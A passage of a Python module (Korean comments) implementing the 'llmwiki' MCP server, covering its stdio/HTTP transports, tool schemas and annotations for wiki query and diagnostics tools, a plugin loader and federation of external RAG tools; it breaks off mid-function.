# -*- coding: utf-8 -*-
"""MCP(Model Context Protocol) 서버 — 표준 라이브러리만 사용. 전송 두 가지 + 브리지.

  (1) stdio      : python -m llmwiki mcp                       — 같은 PC 의 MCP 클라이언트(Claude Desktop/Code, Cursor, opencode …)가 자식 프로세스로 실행.
                   stdin/stdout JSON-RPC 2.0 (한 줄에 하나 또는 Content-Length 프레이밍).
  (2) HTTP       : python -m llmwiki serve  → POST /mcp        — Web 서버와 같은 포트. 또는 python -m llmwiki mcp --transport http --port 8766 (단독).
                   MCP Streamable HTTP(JSON 응답 모드): 요청 본문 = JSON-RPC 단건 또는 배열, 응답 = JSON. initialize 응답에 Mcp-Session-Id 헤더.
                   인증: Authorization: Bearer <API 키>(security.json api_keys, `apikey add`) 또는 세션 쿠키. anonymous_role 이 있으면 토큰 없이 읽기 가능.
                   여러 외부 LLM 이 동시에 붙어도 서버 스레드가 요청마다 생기고 파이프라인 접근은 락으로 직렬화된다.
  (3) 브리지     : python -m llmwiki mcp --connect http://host:8765/mcp --token lwk_…  — stdio 전용 클라이언트가 원격 서버를 쓸 때.
                   stdin 의 JSON-RPC 를 HTTP 로 넘기고 응답을 stdout 으로 되돌린다 (Windows/Linux 모두 Python 만 있으면 됨).

도구(모두 색인을 바꾸지 않음 = read 등급): wiki_query · wiki_search · wiki_related · wiki_doc · wiki_entity · wiki_propose(HITL 제안) · wiki_feedback ·
wiki_forensic(기대 결과 포렌식) · wiki_status · wiki_sources(붙어 있는 외부 RAG/소스) · wiki_external_search(외부 소스 직접 검색)

확장 (docs/RAG_FEDERATION.md):
  - 플러그인 도구: <mcp_plugins_dir>/*.py 의 register(add_tool) 가 도구를 등록 — 코드 수정 없이 도구 추가 (built-in 과 같은 tools/list·tools/call 경로).
  - 페더레이션: mcp_sources.json 의 소스에 expose 를 두면 그 서버의 tool 이 `<source>__<tool>` 로 우리 tools/list 에 나타나고 호출은 그대로 중계된다
    (토글 mcp_federation). 외부 LLM 은 우리 /mcp 하나만 붙이면 여러 RAG 를 쓴다.
  - 외부 RAG 를 검색 채널로: mcp_sources.json retrieve 매핑 + 토글 external_rag (query_engine 이 ext_<source> 채널로 융합).
"""
from __future__ import annotations

import json
import os
import secrets
import sys
import threading
import time
import urllib.error
import urllib.request
from typing import Any, Dict, List, Optional, Tuple

PROTOCOL_VERSION = "2025-06-18"
# 클라이언트가 요청한 버전이 이 안에 있으면 그대로 돌려준다(협상). 없으면 우리 최신을 돌려주고 클라이언트가 판단한다.
SUPPORTED_PROTOCOLS = ("2025-06-18", "2025-03-26", "2024-11-05")
from . import __version__ as _PKG_VERSION
from .auth import AuthError            # overrides 화이트리스트 거부를 도구 오류로 돌려주기 위해
SERVER_INFO = {"name": "llmwiki", "version": _PKG_VERSION}      # = docs/RELEASE_NOTES.md 최신 절 · `--version` · /api/status.version


# ---------------------------------------------------------------- 설정 (server.json `mcp` 절, 기본값은 reqmgr.DEFAULTS["mcp"])
_CFG_CACHE: Dict[str, Any] = {"ts": 0.0, "cfg": None}
_CFG_TTL_S = 5.0


def mcp_config(refresh: bool = False) -> Dict[str, Any]:
    """server.json 의 `mcp` 절 (+ 코드 기본값 · 환경변수 LLMWIKI_SERVER_MCP_<KEY>). 요청마다 파일을 읽지 않도록 5초 캐시.

    키: fed_cache_ttl_s · fed_list_timeout_s · source_timeout_s_default · ingest_timeout_s_default · bridge_timeout_s ·
        max_k · max_doc_chars · plugin_rescan_s · instructions  (설명은 reqmgr.DEFAULTS 의 주석과 docs/MCP.md §9)
    """
    now = time.time()
    if not refresh and _CFG_CACHE["cfg"] is not None and now - _CFG_CACHE["ts"] < _CFG_TTL_S:
        return _CFG_CACHE["cfg"]
    from . import reqmgr as _rq
    cfg: Dict[str, Any] = {k: v for k, v in (_rq.DEFAULTS.get("mcp") or {}).items() if not str(k).startswith("_")}
    try:
        got = (_rq.load_config() or {}).get("mcp")
        if isinstance(got, dict):
            cfg.update({k: v for k, v in got.items() if not str(k).startswith("_")})
    except Exception:
        pass
    _CFG_CACHE.update({"ts": now, "cfg": cfg})
    return cfg


def _cfg_num(key: str, fallback: float) -> float:
    try:
        v = mcp_config().get(key)
        return float(v) if v is not None and v != "" else float(fallback)
    except Exception:
        return float(fallback)


def _cap_int(args: Dict[str, Any], key: str, default: int, cap_key: str) -> int:
    """정수 인자를 1 이상, server.json mcp.<cap_key> 이하로 자른다 (k=100000 같은 값이 파이프라인에 들어가지 않게)."""
    try:
        v = int(args.get(key) if args.get(key) not in (None, "") else default)
    except Exception:
        v = default
    v = max(1, v)
    cap = int(_cfg_num(cap_key, 0))
    return min(v, cap) if cap > 0 else v

# 도구 힌트 (MCP annotations) — 붙는 LLM 이 "이 도구가 무엇을 바꾸는가" 를 스스로 판단한다.
#   readOnlyHint   : 색인·설정을 바꾸지 않음
#   destructiveHint: 되돌릴 수 없는 변경 (우리 도구에는 없음 — 제안은 사람 승인 전까지 큐에만 쌓인다)
#   idempotentHint : 같은 인자로 다시 불러도 같은 상태
#   openWorldHint  : 외부 시스템(다른 RAG)에 나간다
ANNOTATIONS: Dict[str, Dict[str, Any]] = {
    "wiki_query": {"title": "위키에 질문", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_search": {"title": "채널 검색 디버그", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_inspect": {"title": "질의 해부 (LLM 없음)", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_evolve": {"title": "자가진화 제안 보기", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_related": {"title": "유사 문서·연결", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_doc": {"title": "문서 전문", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_entity": {"title": "엔티티 상세", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_propose": {"title": "제안 등록 (사람 승인 필요)", "readOnlyHint": False, "destructiveHint": False, "idempotentHint": False, "openWorldHint": False},
    "wiki_feedback": {"title": "답변 피드백", "readOnlyHint": False, "destructiveHint": False, "idempotentHint": False, "openWorldHint": False},
    "wiki_forensic": {"title": "기대 결과 포렌식", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_status": {"title": "색인·프로바이더 상태", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_analysis": {"title": "상세 분석 리포트", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_sources": {"title": "붙어 있는 외부 소스", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": True},
    "wiki_external_search": {"title": "외부 RAG 직접 검색", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": True},
    "wiki_requests": {"title": "지난 요청과 그때의 답", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    # 재실행은 색인·설정을 바꾸지 않는다(읽기). 다만 **LLM 을 다시 부르므로** 같은 인자로 다시 불러도
    # 답 글자가 달라질 수 있어 idempotent 는 아니다 — 붙는 LLM 이 "한 번 더 불러도 되는가" 를 그렇게 판단한다.
    "wiki_rerun": {"title": "지난 질의를 특정 단계부터 다시", "readOnlyHint": True, "idempotentHint": False, "openWorldHint": False},
    # 스윕 = 재실행 N회. 같은 이유로 읽기이되 idempotent 는 아니다.
    "wiki_sweep": {"title": "파라미터 스윕 (값별 단계 비교)", "readOnlyHint": True, "idempotentHint": False, "openWorldHint": False},
    "wiki_rules": {"title": "질의 규칙 사전 설명·테스트", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    "wiki_graph_rules": {"title": "그래프 빌드 규칙 보기·점검·시험", "readOnlyHint": True, "idempotentHint": True, "openWorldHint": False},
    # 프로파일은 읽기 전용이지만 실행마다 data/graph_profiles 에 이력 파일을 남긴다(색인·설정은 불변) — eval=true 면 LLM 을 부를 수 있어 idempotent 는 아니다
    "wiki_graph_profile": {"title": "그래프 진단 프로파일", "readOnlyHint": True, "idempotentHint": False, "openWorldHint": False},
}

TOOLS: List[Dict[str, Any]] = [
    {"name": "wiki_query", "description": "사내 LLM Wiki 에 질문하고 인용([C#]) 이 붙은 구조화 답변·근거 문단·근거 판정(groundedness)을 받는다 (FTS+Vector+Graph 하이브리드). "
                                          "mode=deep 은 확장·분해·fallback 을 최대로 한 심층 조사(unified search). 결과의 request_id 로 wiki_forensic 을 부를 수 있다.",
     "inputSchema": {"type": "object", "properties": {"question": {"type": "string"}, "k": {"type": "integer", "description": "근거 문단 수", "default": 8},
                                                      "mode": {"type": "string", "enum": ["fast", "normal", "deep"], "default": "normal"},
                                                      "doc_types": {"type": "array", "items": {"type": "string"}, "description": "우선할 문서 유형 (issue, cl, sw_design, hw_design, coding_rule, weekly_report, tc_list)"},
                                                      "preset": {"type": "string", "description": "presets.json 이름 (quality|speed|token|deep_research…)"},
                                                      "output_mode": {"type": "string", "enum": ["answer", "fused", "reranked", "context"],
                                                                      "description": "answer(기본)=답변까지 · fused=융합·부스트 뒤 후보(리랭크 전, structuredContent.candidates/lists/stages) · reranked=리랭크 뒤 후보 · context=컨텍스트([C#] 블록)까지만(structuredContent.context/refs, 답변 LLM 생략)"},
                                                      "overrides": {"type": "object", "description": "이번 호출에만 적용할 평면 설정 (Web /api/query 의 overrides 와 같은 길). 예 {\"top_k_final\": 12, \"answer_mode\": \"best_effort\", \"tuning\": {\"fts_topk_n\": 5, \"fts_topk_w\": 1.5, \"channel_inject\": \"vector:2\"}} — tuning 안의 키는 tuning.json 키(요청 오버레이, 파일에 남지 않음)"}},
                     "required": ["question"]}},
    {"name": "wiki_search", "description": "채널 검색 디버그: fts | vector | graph 를 하나 또는 여러 개 조합해 돌린다. "
                                           "channels 로 여러 채널을 주고 mode 로 조합 방식을 고른다 — or(합집합·커버리지) · and(교집합·채널 합의) · rrf(질의 경로와 같은 가중 융합). "
                                           "결과의 각 행에는 어느 채널이 몇 위로 찾았는지가 함께 온다.",
     "inputSchema": {"type": "object", "properties": {
         "channel": {"type": "string", "enum": ["fts", "vector", "graph"], "description": "채널 하나 (channels 를 쓰면 무시)"},
         "channels": {"type": "array", "items": {"type": "string", "enum": ["fts", "vector", "graph"]},
                      "description": "여러 채널 (예: [\"fts\",\"vector\"]). \"all\" 한 개로 전부."},
         "mode": {"type": "string", "enum": ["or", "and", "rrf"], "default": "or"},
         "require": {"type": "array", "items": {"type": "string", "enum": ["fts", "vector", "graph"]},
                     "description": "이 채널들이 **반드시** 찾아야 한다 (AND). channels 와 섞으면 (channels 중 하나) 그리고 (require 전부)."},
         "exclude": {"type": "array", "items": {"type": "string", "enum": ["fts", "vector", "graph"]},
                     "description": "이 채널들이 찾은 것은 결과에서 **뺀다** (NOT)."},
         "doc_types": {"type": "array", "items": {"type": "string"},
                       "description": "이 문서 유형만 (예 [\"issue\",\"cl\"]). wiki_query 의 doc_types 가 *가중치* 인 것과 달리 여기서는 **거르는** 조건이다. 유형 목록은 wiki_status."},
         "query": {"type": "string"}, "k": {"type": "integer", "default": 8}},
                     "required": ["query"]}},
    {"name": "wiki_evolve", "description": "자가진화 제안 **보기** (읽기 전용): 대기 중 제안 · 최근 적용 이력 · 자동 적용 설정 · 제안 종류 목록. "
                                           "기본으로 제안마다 사람이 읽을 수 있는 설명(explain: 무엇이 · 어느 파일에서 · 어떻게 바뀌고 · "
                                           "리빌드가 드는지 · 값이 성한지)이 붙는다 — Web Evolve 탭 · CLI `evolve show` 와 같은 내용이다. "
                                           "붙어 있는 LLM 이 wiki_propose 로 올린 제안이 어떻게 됐는지 확인할 수 있다. "
                                           "적용·거절은 사람이 한다 (Web Evolve 탭 또는 CLI `evolve apply|reject`).",
     "inputSchema": {"type": "object", "properties": {
         "status": {"type": "string", "enum": ["proposed", "applied", "rejected", "archived", "failed", "rejected_regression"],
                    "description": "이 상태의 제안만 (기본 proposed)"},
         "id": {"type": "integer", "description": "이 번호의 제안 하나만 — 설명 전문을 준다 (CLI `evolve show <id>` 와 같다)"},
         "explain": {"type": "boolean", "default": True,
                     "description": "제안마다 설명을 붙일지 (false 면 payload 원문만 — 토큰을 아낄 때)"},
         "limit": {"type": "integer", "default": 30}}}},
    {"name": "wiki_inspect", "description": "질의 해부 (LLM 없이, 수 ms): 이 질문이 검색에 들어가기 전에 무엇으로 변하는가 — "
                                            "토큰화·키워드·불용어, 규칙 확장(동의어·약어·별칭·제외), 시간 표현 범위, 채널 라우팅 가중치, 고정 근거(pin). "
                                            "답이 이상할 때 '질문이 제대로 이해됐는지' 를 먼저 확인하는 도구.",
     "inputSchema": {"type": "object", "properties": {"query": {"type": "string"}}, "required": ["query"]}},
    {"name": "wiki_related", "description": "입력 텍스트(예: 이슈 분석 결과)와 유사한 문서 + 그래프로 연결된 CL/Issue/TC 를 함께 반환 (이슈 분석 use case).",
     "inputSchema": {"type": "object", "properties": {"text": {"type": "string"}, "doc_types": {"type": "array", "items": {"type": "string"}, "default": ["issue", "cl"]},
                                                      "k": {"type": "integer", "default": 8}}, "required": ["text"]}},
    {"name": "wiki_doc", "description": "문서 전문 + 정규화 메타(front matter) + 연결 노드. doc_id(경로) 또는 문서 ID(ISSUE-2041, CL-55321) 로 조회.",
     "inputSchema": {"type": "object", "properties": {"id": {"type": "string"}, "max_chars": {"type": "integer", "default": 20000}}, "required": ["id"]}},
    {"name": "wiki_entity", "description": "지식 그래프 엔티티 상세(관계·provenance, 문서 참조, 근거 문단).",
     "inputSchema": {"type": "object", "properties": {"name": {"type": "string"}}, "required": ["name"]}},
    {"name": "wiki_propose", "description": "분석 결과·정정·새 관계·코퍼스 갭을 자가진화 제안으로 기록한다 (색인을 직접 바꾸지 않음, 사람 승인 HITL). "
                                            "kind: synonym | alias | entity | relation | wiki_note | query_rule | corpus_gap | pin",
     "inputSchema": {"type": "object", "properties": {"kind": {"type": "string"}, "payload": {"type": "object"}, "reason": {"type": "string"},
                                                      "confidence": {"type": "number", "default": 0.7}}, "required": ["kind", "payload"]}},
    {"name": "wiki_feedback", "description": "wiki_query 답변에 대한 피드백 (+1 도움됨 / -1 틀림·부족 + 정정 메모). query_id 는 wiki_query 결과에 표시된다. 부정 피드백+메모는 위키 편집 노트 제안이 된다.",
     "inputSchema": {"type": "object", "properties": {"query_id": {"type": "integer"}, "feedback": {"type": "integer", "enum": [1, -1]}, "note": {"type": "string"}},
                     "required": ["query_id", "feedback"]}},
    {"name": "wiki_forensic", "description": "기대 결과 포렌식: 답변에 있어야 했던 문서(expected_docs: ISSUE-2003 등)·용어(expected_terms)를 주면 같은 설정으로 검색을 재실행해 "
                                             "그 근거가 fts/vector/graph → 융합 → 리랭크 → 컨텍스트 → 답변 중 어느 단계에서 탈락했는지와 수정안(규칙/pin/튜닝/코퍼스)을 돌려준다. "
                                             "request_id 는 wiki_query 결과의 것 (생략하면 마지막 질의).",
     "inputSchema": {"type": "object", "properties": {"request_id": {"type": "integer"}, "expected_docs": {"type": "array", "items": {"type": "string"}},
                                                      "expected_terms": {"type": "array", "items": {"type": "string"}}, "expected_chunks": {"type": "array", "items": {"type": "string"}},
                                                      "note": {"type": "string"}, "propose": {"type": "boolean", "default": False, "description": "수정안을 HITL 제안 큐에 등록"}},
                     "required": []}},
    {"name": "wiki_status", "description": "색인 통계와 프로바이더 상태. `full=true` 를 주면 **운영 통계**를 함께 — "
                                           "빌드(어느 단계가 느린가) · 질의량(언제 몰리나) · 지연 p50/p95 와 느린 질의 · "
                                           "토큰(질의당·가장 무거운 질의) · 품질 신호(근거 부족·피드백·포렌식) · 사용자별 · "
                                           "디스크(테이블·폴더별) · 임베딩 캐시 적중. CLI `stats --full` · Web 옵저빌리티 › 시스템 과 같은 값.",
     "inputSchema": {"type": "object", "properties": {
         "full": {"type": "boolean", "default": False, "description": "운영 통계 포함"},
         "days": {"type": "number", "default": 7, "description": "full: 집계 기간 (일)"},
         "sections": {"type": "array", "items": {"type": "string"},
                      "description": "full: 이 섹션만 — index|build|queries|latency|tokens|quality|users|storage|embed|trend"},
         "bucket": {"type": "string", "enum": ["day", "week", "month"], "default": "day",
                    "description": "full + sections=trend: 추세를 일/주/월 중 무엇으로 묶을지. 기간은 묶음에 맞춰 자동(주간 12주·월간 1년)"},
         "top": {"type": "integer", "default": 8}}}},
    {"name": "wiki_analysis", "description": "상세 분석 리포트: 질의 한 건(request_id, 생략=마지막)의 모든 단계 결과·설정 스냅샷·품질/속도/토큰 렌즈 소견과 조절점(토글/튜닝 키)을 마크다운으로 돌려준다. "
                                             "튜닝 제안을 만들 때 이 리포트를 근거로 삼는다. analysis_mode 토글이 켜진 질의는 debug·프롬프트 샘플까지 포함.",
     "inputSchema": {"type": "object", "properties": {"request_id": {"type": "integer"}, "focus": {"type": "string", "enum": ["quality", "speed", "tokens", "all"], "default": "all"}}}},
    {"name": "wiki_sources", "description": "이 서버에 붙어 있는 외부 RAG/데이터 소스(mcp_sources.json) 목록: 이름·전송(stdio/http/rest)·용도(retrieve 채널/ingest/expose)·연결 상태. "
                                            "expose 된 소스의 도구는 `<source>__<tool>` 이름으로 이 서버의 tools/list 에 함께 나온다.",
     "inputSchema": {"type": "object", "properties": {"check": {"type": "boolean", "default": False, "description": "true 면 각 소스에 실제 연결해 상태 확인"}}}},
    {"name": "wiki_external_search", "description": "외부 소스(다른 RAG) 하나 또는 전부에 직접 검색을 보내 결과(id·제목·본문·점수·URL)를 그대로 받는다 (융합 없음). "
                                                    "wiki_query 는 external_rag 토글이 켜져 있으면 이 결과를 fts/vector/graph 와 함께 융합한다.",
     "inputSchema": {"type": "object", "properties": {"query": {"type": "string"}, "source": {"type": "string", "description": "소스 이름 (생략=retrieve 매핑이 있는 모든 소스)"},
                                                      "k": {"type": "integer", "default": 5}}, "required": ["query"]}},
    {"name": "wiki_requests", "description": "이 서버에서 지난 요청 목록과 그때의 답을 찾는다. "
                                             "\"전에 이거 물어본 적 있나?\" 를 확인하거나, 같은 질문을 다시 돌리지 않고 그때 답을 그대로 가져올 때 쓴다. "
                                             "source=profile(기본)은 **성공한 요청의 그때 그 답**(requests 테이블) — request_id 로 한 건, 생략하면 최근 목록. "
                                             "source=ledger 는 **요청 원장**: 서버로 들어온 모든 요청의 수명으로, 거절(429/503)·시간초과·취소·중단처럼 "
                                             "답이 없어서 profile 에는 남지 않는 것까지 보인다 — \"왜 실패했나 / 왜 기록이 없나\" 를 볼 때 쓴다. "
                                             "status 로 거르고(rejected,timeout,error,cancelled,unknown), token 을 주면 그 한 건의 사건 타임라인을 돌려준다.",
     "inputSchema": {"type": "object", "properties": {
         "source": {"type": "string", "enum": ["profile", "ledger"], "default": "profile"},
         "request_id": {"type": "integer", "description": "profile: 한 건 상세 (생략하면 목록)"},
         "token": {"type": "string", "description": "ledger: 한 건 상세 (생략하면 목록)"},
         "status": {"type": "string", "description": "ledger: 쉼표로 (rejected,timeout,error,cancelled,unknown,done,running,queued)"},
         "user": {"type": "string", "description": "ledger: 이 사용자의 요청만"},
         "q": {"type": "string", "description": "요약·라벨 문자열로 걸러 찾기"},
         "kind": {"type": "string", "description": "종류로 걸러 찾기 (query | search | build | eval | mcp | cli | http …)"},
         "limit": {"type": "integer", "default": 20}}}},
    {"name": "wiki_rerun", "description": "지난 질의를 **특정 단계부터** 다시 실행한다 (docs/RERUN.md). 저장해 둔 중간 결과로 앞 단계는 재생하고 "
                                          "고른 지점부터만 지금 설정으로 다시 계산하므로, 답변 프롬프트나 검증 임계값만 바꿔 볼 때 훨씬 빠르고 "
                                          "'무엇 때문에 답이 바뀌었는지' 가 분리된다. 색인을 바꾸지 않는 읽기 작업이다. "
                                          "from 은 wiki_rerun 을 인자 없이 부르면 나오는 목록에서 고른다.",
     "inputSchema": {"type": "object", "properties": {
         "request_id": {"type": "integer", "description": "다시 돌릴 원 요청 id (wiki_query/wiki_requests 결과에 있다)"},
         "from": {"type": "string", "description": "재시작점. 생략하면 answer_llm. 목록은 request_id 없이 호출"},
         "overrides": {"type": "object", "description": "이번 실행에만 적용할 평면 설정 (예 {\"claim_check\": false, \"top_k_final\": 12})"}}}},
    {"name": "wiki_sweep", "description": "파라미터 **스윕** (docs/SWEEP.md): 지난 질의(request_id, \"last\" 가능)를 기준으로 키 하나(rrf_k · rerank 토글 · "
                                          "top_k_final · answer_model …)의 값을 바꿔 가며 값마다 **그 키의 단계부터** 재생 재실행하고, 값별 단계 시간·순위·"
                                          "컨텍스트·답변·groundedness 를 기준(첫 값) 과 비교해 돌려준다. 앞 단계는 재생하므로 차이는 그 값의 효과다. "
                                          "key 없이 부르면 스윕할 수 있는 키 목록(type/min/max/choices/point). 값 개수는 config sweep_max_values 로 제한.",
     "inputSchema": {"type": "object", "properties": {
         "request_id": {"type": ["integer", "string"], "description": "기준 요청 id 또는 \"last\" (생략 = last)"},
         "key": {"type": "string", "description": "바꿀 키 (튜닝 키 · 토글 · config 키 · <role>_model|provider|effort)"},
         "values": {"type": "array", "description": "값 목록 (예 [10, 60]). 토글이면 생략 시 [false, true]"},
         "range": {"type": "string", "description": "start:stop:step (예 \"10:100:10\"). values 대신"},
         "repeats": {"type": "integer", "default": 1, "description": "값마다 반복 횟수 (LLM 흔들림 확인용)"},
         "from": {"type": "string", "description": "재시작점 강제 (기본: 키가 속한 단계에서 자동)"}}}},
    {"name": "wiki_rules", "description": "규칙 기반 질의 확장 사전(query_rules.json)을 읽기 전용으로 본다. "
                                          "action=types 는 **규칙 유형 표**(각 유형이 어느 방향으로 어떻게 넓히는지 — 새 규칙을 제안할 때 근거), "
                                          "action=explain 은 용어(term) 하나가 어느 유형·어느 방향으로 무엇을 끌어오는지, "
                                          "action=test 는 질의(q) 전체의 확장 결과(fts_query·alt_queries·related·exclude·seeds·fired)를 돌려준다. 사전을 바꾸지 않는다 "
                                          "(추가는 wiki_propose 로 제안하면 사람이 승인한다).",
     "inputSchema": {"type": "object", "properties": {"action": {"type": "string", "enum": ["explain", "test", "types"], "default": "explain"},
                                                      "term": {"type": "string", "description": "explain 대상 용어"},
                                                      "q": {"type": "string", "description": "test 대상 질의"}}}},
    {"name": "wiki_graph_profile", "description": "지식 그래프 진단 프로파일(docs/history/2026-09-18/IMPLEMENTATION_PLAN_0918_2.md §2.5): 규모·연결성(성분/고립/허브)·문서 커버리지·품질 신호(중복 후보/끊긴 관계/cooccur 비중)·"
                                                  "규칙 기여(죽은 규칙)·질의 활용·개선 제안(어느 파일·키를 고칠지). compare=true 면 직전 실행과 핵심 지표 차이, eval=true 면 그래프 채널만 켠 hit@k 를 함께. "
                                                  "색인·설정은 바꾸지 않지만 실행 이력을 data/graph_profiles 에 남긴다.",
     "inputSchema": {"type": "object", "properties": {"eval": {"type": "boolean", "default": False}, "compare": {"type": "boolean", "default": False}}}},
    {"name": "wiki_graph_rules", "description": "**그래프 빌드** 규칙(data/rules.json)을 읽기 전용으로 본다 — 질의 확장 규칙을 보는 wiki_rules 와 짝이다. "
                                                "action=types 는 엔티티 type 목록·값 종류(relation_patterns[*].value 에 쓸 수 있는 것)·관계 어휘(schema.relations, inverse 포함), "
                                                "action=lint 는 빌드 전 정적 점검(깨진 정규식·없는 type·가려진 link_rules·겹치는 별칭·inverse 짝), "
                                                "action=test 는 문장 하나(q)를 실제로 추출해 어떤 노드와 관계가 생기는지. 규칙을 바꾸지 않는다 "
                                                "(추가는 wiki_propose 의 entity/alias 제안으로 올리면 사람이 승인한다).",
     "inputSchema": {"type": "object", "properties": {
         "action": {"type": "string", "enum": ["types", "lint", "test"], "default": "types"},
         "q": {"type": "string", "description": "test 대상 문장"},
         "doc_type": {"type": "string", "description": "test: 문서 유형 (link_rules 확인용 — 예 cl)"},
         "ext_id": {"type": "string", "description": "test: 문서 ID (예 CL-55302)"}}}},
]

# ---------------------------------------------------------------- 확장: 플러그인 도구 레지스트리 · 페더레이션
_PLUGIN_TOOLS: Dict[str, Tuple[Dict[str, Any], Any]] = {}     # name → (spec, handler(pipe, args) -> result dict | str)
_PLUGIN_STATE: Dict[str, Any] = {"dir": None, "sig": None, "errors": [], "files": [], "checked": 0.0}
_PLUGIN_LOCK = threading.RLock()     # reload 중에 다른 스레드가 _PLUGIN_TOOLS 를 순회하면 "dictionary changed size" — 적재·조회 모두 이 락 안에서
_FED_CACHE: Dict[str, Any] = {}                                # source → {"ts", "tools", "error"} · "_list" → {"error", "duplicates"}
_FED_LOCK = threading.Lock()
FED_SEP = "__"


def register_tool(spec: Dict[str, Any], handler) -> None:
    """플러그인이 부르는 등록 함수. spec = {"name","description","inputSchema"[, "title", "annotations"]}; handler(pipe, args) → MCP result dict 또는 str.
    annotations(readOnlyHint 등)·title 을 적으면 tools/list 에 그대로 실린다 — 붙는 LLM 이 그 도구가 무엇을 바꾸는지 판단하는 근거."""
    name = str(spec.get("name") or "").strip()
    if not name or FED_SEP in name:
        raise ValueError("tool name required (must not contain '%s'): %r" % (FED_SEP, name))
    if any(t["name"] == name for t in TOOLS):
        raise ValueError("built-in tool name: %s" % name)
    sp: Dict[str, Any] = {"name": name, "description": str(spec.get("description") or ""), "inputSchema": spec.get("inputSchema") or {"type": "object", "properties": {}}}
    if spec.get("title"):
        sp["title"] = str(spec["title"])
    if isinstance(spec.get("annotations"), dict):
        sp["annotations"] = dict(spec["annotations"])
    with _PLUGIN_LOCK:
        _PLUGIN_TOOLS[name] = (sp, handler)


def plugins_dir(settings=None) -> str:
    from .config import ROOT, resolve_path
    d = getattr(settings, "mcp_plugins_dir", None) or "plugins/mcp_tools"
    return resolve_path(d) if not os.path.isabs(d) else d


def _plugin_snapshot(d: str, files: List[str]) -> Dict[str, Any]:
    return {"dir": d, "tools": list(_PLUGIN_TOOLS), "errors": list(_PLUGIN_STATE["errors"]), "files": list(files)}


def load_plugins(settings=None, force: bool = False) -> Dict[str, Any]:
    """<mcp_plugins_dir>/*.py (밑줄로 시작하지 않는 파일) 를 import 해 register(register_tool) 를 부른다.

    파일 mtime 이 바뀌면 다시 읽되, 폴더 검사는 `plugin_rescan_s`(server.json mcp, 기본 5초)마다 한 번만 한다 —
    예전에는 tools/list·tools/call **마다** listdir+getmtime 을 돌았다. 적재는 락 안에서 이루어진다.
    """
    import importlib.util
    d = plugins_dir(settings)
    now = time.time()
    with _PLUGIN_LOCK:
        rescan = _cfg_num("plugin_rescan_s", 5)
        if not force and _PLUGIN_STATE["dir"] == d and now - float(_PLUGIN_STATE.get("checked") or 0) < rescan:
            return _plugin_snapshot(d, _PLUGIN_STATE["files"])
        files = sorted(f for f in (os.listdir(d) if os.path.isdir(d) else []) if f.endswith(".py") and not f.startswith("_"))
        sig = tuple((f, os.path.getmtime(os.path.join(d, f))) for f in files)
        _PLUGIN_STATE["checked"] = now
        if not force and _PLUGIN_STATE["dir"] == d and _PLUGIN_STATE["sig"] == sig:
            return _plugin_snapshot(d, files)
        _PLUGIN_TOOLS.clear()
        errors: List[Dict[str, str]] = []
        for f in files:
            path = os.path.join(d, f)
            try:
                spec = importlib.util.spec_from_file_location("llmwiki_mcp_plugin_" + os.path.splitext(f)[0], path)
                mod = importlib.util.module_from_spec(spec)   # type: ignore
                spec.loader.exec_module(mod)                   # type: ignore
                reg = getattr(mod, "register", None)
                if not callable(reg):
                    raise RuntimeError("register(add_tool) 함수 없음")
                reg(register_tool)
            except Exception as e:
                errors.append({"file": f, "error": "%s: %s" % (type(e).__name__, str(e)[:200])})
        _PLUGIN_STATE.update({"dir": d, "sig": sig, "errors": errors, "files": files})
        return _plugin_snapshot(d, files)


def _plugin_tool(name: str) -> Optional[Tuple[Dict[str, Any], Any]]:
    with _PLUGIN_LOCK:
        return _PLUGIN_TOOLS.get(name)


def _plugin_specs() -> List[Dict[str, Any]]:
    with _PLUGIN_LOCK:
        return [sp for sp, _ in _PLUGIN_TOOLS.values()]


def _exposed_sources(settings) -> Dict[str, Dict[str, Any]]:
    if settings is None or not getattr(settings.toggles, "mcp_federation", False):
        return {}
    from . import mcp_client as _mc
    return {n: c for n, c in _mc.enabled_sources(settings, ignore_toggle=True).items() if c.get("expose")}


def federated_tools(settings, refresh: bool = False, ttl_s: Optional[int] = None) -> List[Dict[str, Any]]:
    """expose 된 소스의 tool 을 `<source>__<tool>` 로.

    소스별 tools/list 는 `fed_cache_ttl_s`(기본 300초) 동안 캐시하고, 연결 실패도 같은 시간 동안 기억한다(백오프 —
    죽은 소스 때문에 tools/list 마다 연결을 기다리지 않는다). 캐시가 없을 때의 원격 tools/list 는 `fed_list_timeout_s`(기본 5초)
    안에 끝나야 한다(refresh=True 인 doctor/wiki_sources check 는 소스 자체 timeout_s 를 쓴다). 원격 spec 의 title/annotations 는 그대로 싣는다.
    """
    from . import mcp_client as _mc
    ttl = float(ttl_s if ttl_s is not None else _cfg_num("fed_cache_ttl_s", 300))
    list_to = _cfg_num("fed_list_timeout_s", 5)
    out: List[Dict[str, Any]] = []
    for name, cfg in _exposed_sources(settings).items():
        with _FED_LOCK:
            ent = _FED_CACHE.get(name)
        if refresh or not ent or time.time() - ent["ts"] > ttl:
            scfg = cfg if refresh else dict(cfg, timeout_s=list_to)
            try:
                tools = _mc.remote_tools(name, scfg)
                ent = {"ts": time.time(), "tools": tools, "error": ""}
            except Exception as e:
                ent = {"ts": time.time(), "tools": [], "error": str(e)[:200], "retry_after_s": int(ttl)}
            with _FED_LOCK:
                _FED_CACHE[name] = ent
        allow = cfg.get("expose")
        for t in ent["tools"]:
            tn = str(t.get("name") or "")
            if not tn or (isinstance(allow, list) and tn not in allow):
                continue
            spec: Dict[str, Any] = {"name": name + FED_SEP + tn, "description": "[%s] %s" % (name, t.get("description") or ""),
                                    "inputSchema": t.get("inputSchema") or {"type": "object", "properties": {}}, "_source": name}
            if t.get("title"):
                spec["title"] = "[%s] %s" % (name, t["title"])
            if isinstance(t.get("annotations"), dict):
